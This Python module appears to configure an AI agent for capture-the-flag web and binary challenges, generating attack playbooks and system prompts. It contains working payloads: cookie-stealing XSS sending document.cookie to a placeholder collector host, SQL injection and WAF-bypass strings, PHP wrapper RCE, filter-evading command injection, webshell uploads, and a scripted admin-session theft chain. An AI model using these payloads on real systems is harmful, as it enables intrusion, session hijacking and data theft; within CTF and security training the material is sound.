"""CTF quick-path planner helpers for fast flag-oriented workflows."""

from __future__ import annotations

import re
from collections.abc import Mapping, Sequence
from typing import Any
from urllib.parse import urlparse


FLAG_PATTERN = r"[A-Za-z][A-Za-z0-9_]{1,20}\{[A-Za-z0-9_!@#$%^&*+=:.,?\-]{3,200}\}"

CTF_TOOL_CHAINS: dict[str, dict[str, Any]] = {
    "xss": {
        "tools": ["browser", "terminal", "web_search"],
        "payloads": [
            "<script>fetch('http://COLLECTOR/?c='+document.cookie)</script>",
            "<img src=x onerror=this.src='http://COLLECTOR/?c='+document.cookie>",
            "<svg onload=eval(atob('BASE64_PAYLOAD'))>",
        ],
        "success_pattern": FLAG_PATTERN,
        "notes_key": "xss_sid",
        "next_step": "用收到的 cookie/sid 访问 /admin",
    },
    "sqli": {
        "tools": ["sqlmap", "terminal", "web_search"],
        "payloads": [
            "简单确认: ' OR '1'='1, 1 AND 1=1",
            "黑名单绕过: /**/ 替代空格, /*!50000UNION*/ 替代 UNION, 0xhex 替代引号",
            "sqlmap --tamper=space2comment,between,charencode --batch",
            "手动报错注入: extractvalue(1,concat(0x7c,(SELECT password FROM users LIMIT 1),0x7c))",
            "时间盲注: ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
            "--dbs", "--tables", "--dump",
        ],
        "success_pattern": FLAG_PATTERN,
        "notes_key": "sqli_dump",
        "next_step": "从 dump 结果或报错回显中搜索 flag{}",
    },
    "lfi": {
        "tools": ["terminal", "web_search"],
        "payloads": [
            "基础路径遍历: ?file=../../../etc/passwd, ?file=/flag, ?file=/flag.txt",
            "PHP伪协议读源码: php://filter/read=convert.base64-encode/resource=index.php",
            "PHP输入流RCE: php://input (POST <?php system('cat /flag'); ?>",
            "Data协议RCE: data://text/plain,<?php system('cat /flag'); ?>",
            "Phar反序列化: phar://uploads/image.jpg (配合POP链)",
            "编码绕过: %2e%2e%2f, ....//, %00截断(PHP<5.3.4)",
        ],
        "success_pattern": r"root:.*:0:0|flag\{.*?\}|CTF\{.*?\}",
        "notes_key": "lfi_read",
        "next_step": "若直接读flag失败，用php://filter读源码分析过滤规则并构造绕过",
    },
    "cmdi": {
        "tools": ["terminal", "web_search", "commix"],
        "payloads": ["; id", "| id", "`id`", "$(id)"],
        "success_pattern": r"uid=.*|flag\{.*?\}|CTF\{.*?\}",
        "notes_key": "cmdi_exec",
        "next_step": "cat /flag.txt | /flag | /root/flag.txt",
    },
    "ssrf": {
        "tools": ["terminal", "web_search"],
        "payloads": [
            "http://127.0.0.1:端口/敏感路径",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/",
        ],
        "success_pattern": r"flag\{.*?\}|CTF\{.*?\}|root:.*:0:0|HTTP/1\.[01]",
        "notes_key": "ssrf_probe",
        "next_step": "根据回显确认内网路径，继续枚举",
    },
    "upload": {
        "tools": ["browser", "terminal"],
        "payloads": ["webshell.php", "shell.php.jpg", "shell.pHp"],
        "success_pattern": r"uid=.*|flag\{.*?\}|CTF\{.*?\}",
        "notes_key": "upload_shell",
        "next_step": "上传后访问 webshell 路径执行 cat /flag",
    },
    "web": {
        "tools": ["browser", "terminal", "web_search"],
        "payloads": [
            "枚举首页、主 JS、表单、隐藏路径",
            "优先收敛到已观察到的登录/访问链",
        ],
        "success_pattern": FLAG_PATTERN,
        "notes_key": "web_finding",
        "next_step": "按运行时证据切到 xss/sqli/lfi/ssrf/upload 具体链路",
    },
    "crypto": {
        "tools": ["crypto_solve", "terminal", "web_search"],
        "payloads": [
            "用crypto_solve自动识别: base64_decode / hex_decode / rot13 / caesar_brute / xor_single_byte_brute / hash_identify",
            "RSA题型: 提取(n,e,c), 优先尝试rsa_small_e(e=3), 其次rsa_wiener(小d), 再试rsa_common_modulus/rsa_hastad",
            "古典密码: Caesar(26种偏移), Vigenere(Kasiski分析密钥长度), Bacon(A/B编码)",
            "哈希破解: 长度识别→在线库(crackstation)→hashcat本地爆破",
            "对称加密: 检查AES-ECB/CBC模式弱点、Padding Oracle、Bit Flipping",
        ],
        "success_pattern": FLAG_PATTERN,
        "notes_key": "crypto_decode",
        "next_step": "用crypto_solve验证候选结果，提取flag{}",
    },
    "pwn": {
        "tools": ["radare2", "angr_solve", "terminal"],
        "payloads": [
            "radare2分析: afl(函数), iz(字符串), pdf @ main(反汇编), iI(保护信息)",
            "angr_solve自动求解: 传入binary_path + find_addrs(成功地址) + avoid_addrs(失败地址)",
            "checksec检查保护: NX/PIE/Canary/RELRO/ASLR",
            "栈溢出: cyclic找偏移 → ROPgadget找gadget → ret2libc/ret2system",
            "格式化字符串: %p泄露栈地址 → 覆盖GOT → 泄露canary/PIE base",
            "堆利用: UAF → tcache/fastbin poisoning → 任意地址写",
        ],
        "success_pattern": FLAG_PATTERN,
        "notes_key": "pwn_chain",
        "next_step": "根据保护级别选择利用链: 无NX用shellcode, 无PIE用ret2libc, 有Canary先泄露",
    },
    "misc": {
        "tools": ["browser", "terminal"],
        "payloads": ["源码/注释/附件/隐藏路由"],
        "success_pattern": FLAG_PATTERN,
        "notes_key": "misc_finding",
        "next_step": "根据回显重新判型",
    },
}

CTF_QUICK_PATHS: dict[str, list[str]] = {
    "sqli": [
        "使用 recon_bundle 快速获取目标首页 HTML、表单、前端 JS 与可见路由",
        "Step 1: 用 ' OR '1'='1 或 1 AND 1=1 快速确认注入点存在",
        "Step 2: 若常规 payload 被拦截（无回显/403/WAF页），先判断黑名单过滤类型：",
        "  - 空格过滤 → 用 /**/ 或 %0b/%0c/%0a/%09 替代空格，sqlmap --tamper=space2comment",
        "  - UNION/SELECT 过滤 → 用 /*!50000UNION*/ /*!50000SELECT*/ 或大小写混合 UnIoN SeLeCt",
        "  - 引号过滤 → 用 0x666c6167(hex) 或 CHAR(102,108,97,103) 替代字符串",
        "  - 逗号过滤 → UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c",
        "  - 等号过滤 → 用 LIKE / RLIKE / BETWEEN / IN 替代 =",
        "Step 3: sqlmap 配合 tamper 脚本自动跑: sqlmap -u <url> --tamper=space2comment,between,charencode --batch --dbs",
        "Step 4: 若 sqlmap 失败，切换到手动报错注入: ' AND extractvalue(1,concat(0x7c,(SELECT LOAD_FILE('/flag')),0x7c))-- -",
        "Step 5: 若无报错回显，尝试时间盲注: ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
        "Step 6: sqlmap --tables -D <db> --batch → --dump -T <table> --batch",
        "在结果中搜索 flag{} 模式",
    ],
    "xss": [
        "使用 recon_bundle 快速获取目标首页 HTML、前端 JS、表单和路由",
        "先用最小 `<script>` / 同源外带 payload 探测；若第一次未触发，立即切到第二个最小事件型变体（如 img/svg），并明确记录 first failed / second worked",
        "若出现 /visit + /admin + 登录/注册表单组合，优先按 bot-XSS 链收敛：payload -> /visit -> sid/管理员内容 -> /admin",
        "在响应 body 搜索 flag{} 模式",
    ],
    "lfi": [
        "Step 1: 尝试基础路径遍历: ?file=../../../etc/passwd, ?file=/flag, ?file=/flag.txt, ?file=../../flag.php",
        "Step 2: 若被拦截，尝试编码绕过: %2e%2e%2f, ....//, ..%2f, %00截断(旧PHP)",
        "Step 3: 用 PHP 伪协议读源码: ?file=php://filter/read=convert.base64-encode/resource=index.php",
        "Step 4: 若允许包含且需要 RCE，尝试 php://input: POST <?php system('cat /flag'); ?>",
        "Step 5: 尝试 data:// 协议: ?file=data://text/plain,<?php system('cat /flag'); ?>",
        "Step 6: 若存在文件上传，尝试 phar:// 反序列化: phar://uploads/image.jpg",
        "Step 7: 读取 /proc/self/environ 或 /proc/self/cmdline 获取环境变量/启动参数",
        "Step 8: 若直接读不到 flag，用 php://filter 读所有 PHP 源码，分析过滤规则并构造更精确的绕过",
        "在响应中搜索 flag{} 模式",
    ],
    "cmd": [
        "使用 recon_bundle 快速确认目标页面结构和输入点",
        "尝试 ;id , |id , `id` , $(id) 注入验证漏洞存在",
        "若目标疑似 PHP，用 cat\$IFS\$1index.php 读取源码，分析过滤规则（preg_match 黑名单）——这是最高优先级步骤，不要盲目猜测 payload",
        "若空格被过滤：用 \$IFS\$1 代替空格。注意：\$IFS 后直接跟字母会被 shell 解析为一个变量名（如 \$IFSY2F0...），必须加 \$1/\$9 分隔。如果 { } 也被过滤，则不能用 \${IFS}",
        "若 flag 字符串被过滤：优先用 base64 编码绕过：echo\$IFS\$1Y2F0IGZsYWcucGhw|base64\$IFS\$1-d|sh（解码后为 cat flag.php）。若 bash 被过滤，用 sh 代替。也可用变量拼接：a=g;cat\$IFS\$1fla\$a.php（注意整个 payload 中不能出现 f→l→a→g 的顺序）",
        "尝试 ;cat /flag , ;cat /flag.txt , ;find / -name flag* 2>/dev/null",
        "尝试 ;env 读环境变量",
        "在响应中搜索 flag{} 模式",
    ],
    "web": [
        "使用 recon_bundle 快速获取目标首页 HTML、JS、表单、路由和目录",
        "若观察到 /visit + /admin + 登录/注册表单，优先验证 bot-XSS / cookie theft 链",
        "若页面文案/注释提到备份、源码、压缩包，优先探测常见备份路径",
        "尝试默认凭据 admin/admin admin/password",
        "在响应中搜索 flag{} 模式",
    ],
    "crypto": [
        "Step 1: 观察密文特征识别编码/密码类型: 长度4倍数→base64; 纯0-9a-f→hex; 纯字母乱码→Caesar/Rot13/Vigenere; 大整数(n,e,c)→RSA",
        "Step 2: 先用 crypto_solve 工具自动尝试常见解码: base64_decode / hex_decode / rot13 / caesar_brute / xor_single_byte_brute / hash_identify",
        "Step 3: 若是 RSA 题型，提取 n,e,c 后按优先级尝试: rsa_small_e(e=3 且 m^e<n) → rsa_wiener(小d) → rsa_common_modulus(同一n不同e) → rsa_hastad(广播攻击) → 在线分解(factordb.com)",
        "Step 4: 若 crypto_solve 未解出，检查是否为多层编码(如 base64→hex→Caesar)或古典密码(Vigenere需要Kasiski分析密钥长度)",
        "Step 5: 哈希题: 用 hash_identify 识别算法 → crackstation.net 在线查 → 本地 hashcat 爆破常见CTF弱口令",
        "Step 6: 对称加密题: 检查 ECB模式(重排密文块)、CBC Padding Oracle、Bit Flipping 攻击",
        "在输出中搜索 flag{} 模式",
    ],
    "pwn": [
        "Step 1: 用 radare2 快速分析二进制: afl(函数列表), iz(字符串), pdf @ main(反汇编), iI(保护信息)",
        "Step 2: 用 checksec 确认保护级别: NX(栈不可执行)→用ROP; PIE(地址随机化)→需要泄露基址; Canary(栈cookie)→需要泄露或绕过; RELRO(GOT保护)→决定能否改GOT",
        "Step 3: 若是简单 crackme/keygen 类题目，直接用 angr_solve 自动求解: 传入 binary_path + find_addrs(成功分支虚拟地址) + avoid_addrs(失败分支虚拟地址) + input_length",
        "Step 4: 栈溢出: 用 cyclic 找偏移 → ROPgadget/ropper 找 gadget → 无PIE直接ret2libc; 有PIE先泄露代码地址算基址",
        "Step 5: 格式化字符串: %p泄露栈上地址 → 定位canary/PIE base/libc地址 → 写GOT劫持执行流",
        "Step 6: 堆利用: 识别UAF/Double Free/Off-by-one → tcache/fastbin poisoning → 任意地址写 → 改__free_hook或malloc_hook",
        "Step 7: 若存在 fork server，可用逐字节爆破 canary/PIE(虽然慢但稳定)",
        "在输出中搜索 flag{} 模式",
    ],
    "misc": [
        "browser 访问目标，查看全部响应头和 cookie",
        "dirscan 找隐藏路径",
        "查看页面源码、JS 文件、注释",
        "binary analyze 任何附件",
        "在所有输出中搜索 flag{} 模式",
    ],
}

_BOT_XSS_TYPES = {"web", "xss"}
_COOKIE_CLUE_RE = re.compile(
    r"(?i)\b(?:sid|session(?:id)?|auth(?:entication)?|token)\b|document\.cookie"
)
_AUTH_ACTION_HINTS = ("login", "register", "signup", "sign-up", "signin", "sign-in")
_USER_FIELD_HINTS = ("user", "name", "email", "login")
_PASS_FIELD_HINTS = ("pass", "pwd")
_WRITABLE_FIELD_HINTS = (
    "bio",
    "profile",
    "comment",
    "message",
    "content",
    "about",
    "note",
    "desc",
    "description",
    "text",
    "body",
)


def _normalise_cookie_names(
    cookies: Sequence[Mapping[str, Any]] | None = None, cookie_string: str = ""
) -> list[str]:
    names: list[str] = []
    seen: set[str] = set()

    for cookie in cookies or ():
        if not isinstance(cookie, Mapping):
            continue
        name = str(cookie.get("name") or "").strip()
        if name and name.lower() not in seen:
            seen.add(name.lower())
            names.append(name)

    if cookie_string:
        for chunk in cookie_string.split(";"):
            name = chunk.split("=", 1)[0].strip()
            if name and name.lower() not in seen:
                seen.add(name.lower())
                names.append(name)

    return names


def _looks_like_auth_form(form: Mapping[str, Any] | None) -> bool:
    if not isinstance(form, Mapping):
        return False

    action = str(form.get("action") or "").lower()
    method = str(form.get("method") or "get").lower()
    inputs = form.get("inputs") or []
    input_names = [
        str(inp.get("name") or "").strip().lower()
        for inp in inputs
        if isinstance(inp, Mapping)
    ]

    has_user = any(
        any(hint in name for hint in _USER_FIELD_HINTS) for name in input_names
    )
    has_pass = any(
        any(hint in name for hint in _PASS_FIELD_HINTS) for name in input_names
    )
    action_hint = any(hint in action for hint in _AUTH_ACTION_HINTS)

    return method in {"post", "get"} and (action_hint or (has_user and has_pass))


def find_auth_form(
    forms: Sequence[Mapping[str, Any]] | None = None,
) -> Mapping[str, Any] | None:
    for form in forms or ():
        if _looks_like_auth_form(form):
            return form
    return None


def find_writable_field_name(
    forms: Sequence[Mapping[str, Any]] | None = None,
) -> str | None:
    for form in forms or ():
        if not isinstance(form, Mapping):
            continue
        for inp in form.get("inputs") or []:
            if not isinstance(inp, Mapping):
                continue
            name = str(inp.get("name") or "").strip().lower()
            if any(hint in name for hint in _WRITABLE_FIELD_HINTS):
                return name
    return None


def _auth_form_payload_hint(forms: Sequence[Mapping[str, Any]] | None = None) -> str:
    writable = find_writable_field_name(forms)
    if writable:
        return f"优先测试表单里的 `{writable}` 这类可写字段是否会被 bot 侧回放或渲染。"

    return (
        "若暂未观察到 `bio/comment/profile` 这类字段，先验证注册/登录流里已有可控字段"
        "是否会在 bot 侧回显，而不是凭空假定额外 sink。"
    )


def get_ctf_chain(chtype: str) -> dict[str, Any]:
    """Return a structured chain definition, defaulting to web."""
    return dict(CTF_TOOL_CHAINS.get(chtype.lower(), CTF_TOOL_CHAINS["web"]))


def get_required_tools_for_chain(chtype: str) -> list[str]:
    return list(get_ctf_chain(chtype).get("tools", []))


def get_ctf_payloads(chtype: str) -> list[str]:
    return list(get_ctf_chain(chtype).get("payloads", []))


def detect_type(page_source: str, url: str) -> str:
    """Best-effort web CTF type detection from current page evidence."""
    source = str(page_source or "")
    lowered = source.lower()
    parsed = urlparse(str(url or ""))
    path_and_query = f"{parsed.path}?{parsed.query}".lower()
    path_only = parsed.path.lower()

    misc_markers = (
        ".db",
        ".sqlite",
        ".sqlite3",
        ".wal",
        ".zip",
        ".7z",
        ".rar",
        ".pcap",
        ".cap",
        ".bin",
    )
    if any(marker in path_and_query for marker in misc_markers):
        return "misc"
    if any(marker in lowered for marker in misc_markers):
        return "misc"
    if "directory listing for" in lowered and any(marker in lowered for marker in misc_markers):
        return "misc"
    if "index of /" in lowered and any(marker in lowered for marker in misc_markers):
        return "misc"

    if "upload" in lowered or "type=file" in lowered or " name=\"file\"" in lowered:
        return "upload"
    if "?file=" in path_and_query or "?path=" in path_and_query:
        return "lfi"
    if "?url=" in path_and_query or "?target=" in path_and_query:
        return "ssrf"
    if any(
        marker in lowered
        for marker in (
            "/visit",
            "document.cookie",
            "onerror=",
            "onload=",
            "window.open(",
        )
    ):
        return "xss"
    has_auth_fields = "username" in lowered and "password" in lowered
    if all(marker in lowered for marker in ("login", "username", "password")):
        return "xss" if "/admin" in lowered or "/visit" in lowered else "sqli"
    if has_auth_fields:
        return "xss" if "/admin" in lowered or "/visit" in lowered else "sqli"
    if "eyj" in lowered or "bearer " in lowered or "authorization" in lowered:
        return "jwt"
    if "select " in lowered or "union" in lowered or "sql" in lowered:
        return "sqli"
    if path_only.endswith("/") and any(marker in lowered for marker in ("app.db", ".wal", ".zip", ".sqlite")):
        return "misc"
    return "web"


def get_ctf_quick_path(chtype: str) -> list[str]:
    """返回指定题型的快速通道步骤，未知类型回退到 web。"""
    return list(CTF_QUICK_PATHS.get(chtype.lower(), CTF_QUICK_PATHS["web"]))


def build_ctf_convergence_hint(
    chtype: str,
    *,
    endpoints: Sequence[str] | None = None,
    forms: Sequence[Mapping[str, Any]] | None = None,
    cookie_string: str = "",
    cookies: Sequence[Mapping[str, Any]] | None = None,
    evidence_blobs: Sequence[str] | None = None,
) -> str:
    """Build a lightweight, evidence-gated convergence hint for bot-XSS chains.

    The goal is not to hardcode a single challenge name, but to bias the prompt
    toward the common `payload -> /visit -> sid -> /admin` chain only when the
    current runtime/source evidence resembles that shape.
    """
    if chtype.lower() not in _BOT_XSS_TYPES:
        return ""

    observed_endpoints = {str(ep).strip() for ep in (endpoints or ()) if str(ep).strip()}
    has_visit = "/visit" in observed_endpoints
    has_admin = "/admin" in observed_endpoints
    auth_forms = [form for form in (forms or ()) if _looks_like_auth_form(form)]
    has_auth_form = bool(auth_forms)

    cookie_names = _normalise_cookie_names(cookies=cookies, cookie_string=cookie_string)
    blob_text = "\n".join(str(blob) for blob in (evidence_blobs or ()) if blob)
    cookie_clues = [name for name in cookie_names if _COOKIE_CLUE_RE.search(name)]
    if not cookie_clues and _COOKIE_CLUE_RE.search(blob_text):
        cookie_clues.append("runtime/source sid-cookie clue")

    if not (has_visit and has_admin and has_auth_form):
        return ""

    signal_bits = ["/visit present", "/admin present", "auth form present"]
    if cookie_clues:
        signal_bits.append("cookie/sid clue present")

    lines = [
        "## Likely bot-XSS / sid-theft convergence",
        "The current runtime/source evidence matches a common admin-bot XSS shape. Prioritize the concrete exploit chain below before exploring unrelated branches.",
        f"- Signals: {', '.join(signal_bits)}",
        "- Treat this as a planning bias, not as proof of exploitability: each hop still needs runtime confirmation.",
        "Priority exploit plan:",
        f"1. Design the smallest payload that fits an actually observed writable/auth flow. {_auth_form_payload_hint(auth_forms)}",
        "2. Use the observed login/registration flow to submit that payload; prefer same-origin behavior justified by current runtime evidence.",
        "3. Trigger `/visit` so the admin/bot renders the stored payload.",
    ]

    if cookie_clues:
        lines.extend(
            [
                "4. If the bot-side execution can read a `sid`/session cookie, send only the needed `sid` to a simple local collector and parse the collector output.",
                "5. Replay the captured `sid` against `/admin`, then inspect the response for admin-only content or `flag{...}`.",
            ]
        )
    else:
        lines.extend(
            [
                "4. Verify whether the bot-side payload can fetch `/admin` directly or expose a readable session signal; if exfiltration is needed, use a simple collector instead of speculative browser tricks.",
                "5. Once `sid` or admin-only content is recovered, use it on `/admin` and inspect the response for `flag{...}`.",
            ]
        )

    lines.extend(
        [
            "- Keep the chain concrete: `payload -> /visit -> collector -> sid -> /admin` unless new runtime evidence disproves it.",
            "- If `/visit` runs but the collector/admin signal does not move, treat the current payload variant as failed and retry once with a second minimal same-origin variant (for example `script` -> `img/svg` event handler). Record which variant failed and which one worked before continuing.",
            "- Do not assume cross-origin iframe, popup, `contentDocument`, or attacker-origin `document.cookie` access.",
            "- Deprioritize unrelated detours unless current runtime evidence starts pointing there.",
        ]
    )

    return "\n".join(lines)


def build_ctf_system_prompt(chtype: str, hint: str) -> str:
    """为 CTF 模式生成专用 system prompt 后缀。"""
    steps = get_ctf_quick_path(chtype)
    numbered = "\n".join(f"{i + 1}. {step}" for i, step in enumerate(steps))
    hint_line = f"\nHint from challenge: {hint}" if hint else ""
    return f"""
## CTF Quick-Path Mode: {chtype.upper()}
{hint_line}

Recommended attack sequence (execute in order, stop on flag):
{numbered}

Rules:
- Execute steps in order. Stop the moment flag{{}} is found.
- Prefer runtime/browser/source evidence from the current target over generic CTF knowledge.
- Do NOT claim a route, sink, or bug class as confirmed until it is observed in current runtime output or current source.
- Use finish to mark steps complete. BATCH whenever possible: if multiple steps are done, call finish(steps=[{{"action":"complete","step_id":1,"result":"..."}},{{"action":"complete","step_id":2,...}}]) in ONE call. Only use single-step finish when you must mark one step before proceeding.
- If a step yields new info (e.g. a found path or DB name), update subsequent steps.
- Do NOT spend time on: full nmap scans, subdomain enum, OS fingerprinting.
- Flag patterns: flag{{...}}, ctf{{...}}, CTF{{...}}, or any {{...}} in responses.
"""
